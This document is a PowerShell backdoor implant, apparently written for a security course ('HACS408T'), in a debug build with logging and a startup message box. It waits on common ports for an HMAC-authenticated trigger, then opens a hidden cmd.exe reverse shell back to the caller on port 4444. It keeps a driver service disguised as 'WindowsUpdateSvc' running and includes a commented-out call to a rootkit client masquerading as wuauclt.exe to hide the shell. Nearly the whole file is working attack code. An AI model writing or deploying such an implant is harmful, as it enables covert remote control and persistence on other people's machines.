# Implant.ps1 - DEBUG VERSION (NO Out-Null + visible proof on reboot)
$SharedSecret = "bluewinstheday!!"
$TriggerPort  = 443
$BaseReversePort = 4444
$CurrentReversePort = $BaseReversePort

$NidhoggClient = "C:\Windows\System32\wuauclt.exe"

# ====================== DEBUGGING SETUP ======================
$LogFile = "C:\Windows\Temp\implant_debug.log"
$AliveFile = "C:\Windows\Temp\implant_alive.txt"

function Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp | PID:$PID | $Message" | Out-File $LogFile -Append -Encoding UTF8
}

function Update-Alive {
    "Implant is RUNNING - Last heartbeat: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') | PID: $PID" | Out-File $AliveFile -Force
}

# Visible proof that the implant ran after reboot
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show(
    "IMPLANT STARTED ON REBOOT`nPID: $PID`n`nCheck C:\Windows\Temp\implant_debug.log and implant_alive.txt", 
    "HACS408T Implant DEBUG - SUCCESS", 
    "OK", 
    "Information"
) | Out-Null   # ← only this one left (MessageBox return value)

Log "=== IMPLANT STARTED SUCCESSFULLY ON BOOT ==="
Log "Running as: $(whoami)"
Log "PowerShell version: $($PSVersionTable.PSVersion)"
Update-Alive

Write-Host "[+] Implant DEBUG version started - PID $PID" -ForegroundColor Green
Log "[+] Implant main loop starting"

while ($true) {
    try {
        Update-Alive  # heartbeat every loop

        # Keep driver alive
        $svcStatus = sc.exe query WindowsUpdateSvc
        if ($svcStatus -notmatch "RUNNING") {
            Write-Host "[+] Restarting WindowsUpdateSvc driver" -ForegroundColor Yellow
            sc.exe start WindowsUpdateSvc
            Log "[+] Restarted WindowsUpdateSvc driver"
        }

        # ====================== LISTENER WITH PORT FALLBACK ======================
        $PortsToTry = @(443, 8443, 10443, 4443)
        $listener = $null
        $boundPort = $null

        foreach ($p in $PortsToTry) {
            try {
                $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $p)
                $listener.Server.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
                $listener.Start()
                $boundPort = $p
                Write-Host "[+] Listener successfully bound to port $boundPort" -ForegroundColor Green
                Log "[+] Listener bound to port $boundPort"
                break
            } catch {
                if ($listener) { $listener.Stop(); $listener.Server.Dispose() }
                Log "[-] Failed to bind port $p : $($_.Exception.Message)"
            }
        }

        if (-not $boundPort) {
            Write-Host "[-] Failed to bind any listener port - retrying" -ForegroundColor Red
            Log "[-] Failed to bind any listener port"
            Start-Sleep -Seconds 30
            continue
        }

        try {
            Write-Host "[+] Waiting for connection on port $boundPort..." -ForegroundColor Cyan
            Log "[+] Waiting for connection on port $boundPort..."
            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            # HMAC Challenge-Response
            $challenge = Get-Random -Maximum 1000000000
            $writer.WriteLine("CHALLENGE:$challenge")
            $response = $reader.ReadLine().Trim()

            $hmac = New-Object System.Security.Cryptography.HMACSHA256
            $hmac.Key = [Text.Encoding]::UTF8.GetBytes($SharedSecret)
            $expected = -join ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes("$challenge")) | ForEach-Object { $_.ToString("x2") })

            if ($response -eq $expected) {
                Write-Host "[+] Valid client connected - starting reverse shell" -ForegroundColor Green
                Log "[+] Valid client connected - starting reverse shell"
                $writer.WriteLine("OK - Using port $CurrentReversePort")
                Start-Sleep -Seconds 1

                $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
                $listener.Stop()

                # ====================== REVERSE SHELL ======================
                $revClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $CurrentReversePort)
                $revStream = $revClient.GetStream()
                $revWriter = New-Object System.IO.StreamWriter($revStream)
                $revReader = New-Object System.IO.StreamReader($revStream)
                $revWriter.AutoFlush = $true

                $process = New-Object System.Diagnostics.Process
                $process.StartInfo.FileName = "cmd.exe"
                $process.StartInfo.Arguments = "/Q"
                $process.StartInfo.RedirectStandardInput = $true
                $process.StartInfo.RedirectStandardOutput = $true
                $process.StartInfo.RedirectStandardError = $true
                $process.StartInfo.UseShellExecute = $false
                $process.StartInfo.CreateNoWindow = $true
                $process.StartInfo.WindowStyle = "Hidden"
                $process.Start()   # ← NO Out-Null

                Write-Host "[+] Started reverse shell cmd.exe - PID: $($process.Id)" -ForegroundColor Green
                Log "[+] Started reverse shell cmd.exe - PID: $($process.Id)"

                # Hide the shell process (still commented during debug)
                # & $NidhoggClient "process hide $($process.Id)"

                # Async I/O
                $outputAction = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine($e.Data) } } catch {} }
                $errorAction  = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine("[ERR] $($e.Data)") } } catch {} }

                $outEvent = Register-ObjectEvent $process.StandardOutput "OutputDataReceived" -Action $outputAction
                $errEvent = Register-ObjectEvent $process.StandardError  "ErrorDataReceived"  -Action $errorAction

                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()

                try {
                    while (-not $process.HasExited -and $revClient.Connected) {
                        if ($revStream.DataAvailable) {
                            $cmd = $revReader.ReadLine()
                            if ($cmd) { $process.StandardInput.WriteLine($cmd) }
                        }
                        Start-Sleep -Milliseconds 50
                    }
                } finally {
                    if ($outEvent) { Unregister-Event -SourceIdentifier $outEvent.Name -EA SilentlyContinue }
                    if ($errEvent) { Unregister-Event -SourceIdentifier $errEvent.Name -EA SilentlyContinue }
                    if (-not $process.HasExited) { $process.Kill() }
                    $revClient.Close()
                    Log "[+] Reverse shell session ended"
                }
            } else {
                Log "[-] Invalid HMAC response"
                $writer.WriteLine("DENIED")
            }
        }
        finally {
            if ($listener) { 
                try { $listener.Stop(); $listener.Server.Dispose() } catch {} 
            }
            if ($client) { try { $client.Close() } catch {} }
        }

        Start-Sleep -Seconds 3
    }
    catch {
        Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
        Log "[-] ERROR: $($_.Exception.Message)"
        Start-Sleep -Seconds 30
    }
}